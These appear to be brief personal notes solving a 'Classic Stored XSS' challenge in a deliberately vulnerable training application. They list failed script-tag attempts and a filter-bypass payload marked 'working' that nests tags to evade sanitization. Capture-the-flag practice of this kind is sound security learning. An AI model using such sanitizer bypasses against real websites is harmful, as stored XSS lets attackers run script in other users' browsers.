## Classic Stored XSS
### Challenge: Perform an XSS attack with \<script\>alert\(`xss`\)\</script\> on a legacy page within the application.


<script>alert('Hello!')</script>
lert('Hello!')</script>

<script>A<script>Aalert('hello')</script>
alert('hello')</script>


working:
<<a>sscript>alert('Hello!')</script>
